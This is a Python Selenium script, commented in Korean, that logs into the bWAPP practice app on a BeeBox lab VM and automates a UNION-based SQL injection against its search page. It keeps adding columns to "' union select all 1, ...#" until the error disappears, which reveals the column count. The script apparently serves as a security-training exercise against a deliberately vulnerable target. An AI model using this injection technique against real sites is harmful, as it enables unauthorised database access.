
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import Select
import time

driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

try:
    driver.get("http://192.168.56.101/bWAPP/login.php")  # BeeBox의 로그인창 접속(크롬으로 접속)

    driver.implicitly_wait(3)  # 브라우저에서 사용되는 엔진 자체에서 파싱되는 시간을 기다려준다.
    driver.find_element(By.ID, value="login").send_keys('bee')  # 사용자 키입력 처리 bee입력
    driver.find_element(By.ID, value ="password").send_keys('bug') #bug입력

    select_fr = Select(driver.find_element(By.NAME, value ='security_level'))
    select_fr.select_by_index(0)#low를 선택한다. 

    driver.find_element(By.XPATH, value ='//*[@id="main"]/form/button').send_keys(Keys.ENTER)#로그인 버튼을 클릭 
    
    select_fr = Select(driver.find_element(By.NAME, value ='bug'))
    select_fr.select_by_index(13) #SQL Injection GET/Search으로 이동한다. 
    driver.find_element(By.XPATH, value ='//*[@id="main"]/form/button').send_keys(Keys.ENTER)

    i = 1 # union 명령어 입력시 순차적으로 숫자를 입력하기 위한 변수 
    q = '\' union select all 1'#sql문을 나타내는 문자열이다. 반복문을 돌면서 뒤에 숫자가 더 붙을 것이다. 
    while i < 101:# 1~100까지 반복하게 했다. (하지만 100까지 가지 않더라도 성공하면 반복문 종료)
        driver.find_element(By.ID, value="title").send_keys(q + "#")#search 창에 sql문인 q를 넣었다. 
        #sql 여기서 #는 sql 입력 후 코드 내부에서 sql 로 인식하고 
        # #는 주석 처리이므로 내부적으로 sql 구문처리 시 마지막에 있는 '를 없애주는 역할을 하여 공격 가능하게 한다. 
        driver.find_element(By.NAME, value ='action').send_keys(Keys.ENTER)
        #입력 버튼을 클릭한다. 

        result = driver.find_element(By.XPATH, value='//*[@id="table_yellow"]/tbody/tr[2]/td')
        #버튼을 누른 후 결과를 받아온다. 
        
        if result.text.startswith('Error:'):#만약 그 결과창에 Error:라고 시작한다면 아직 공격 성공을 하지 않은 것이므로 
        #숫자를 늘려가며 공격을 시도하게 할 것이다. 
            i = i+1 # 공격 성공하지 못했으므로 다음 숫자를 sql 문에 추가시킨다. 
            q = q+', '+str(i)#다음 값을 추가할 떄는 콤마로 추가한다.
            continue#반복문을 계속한다. 
        
        else:#Error가 안나온다면 공격에 성공한 것이므로 반복문을 멈춘다. 
            time.sleep(10) #결과를 10초 보여준다. -> 결과 확인을 위해 어쩔 수 없이 사용
            break
    

finally:#finally를 이용해 예외 발생 여부에 상관없이 항상 수행
    driver.quit()  # 브라우저를 닫고, 프로세스도 종료
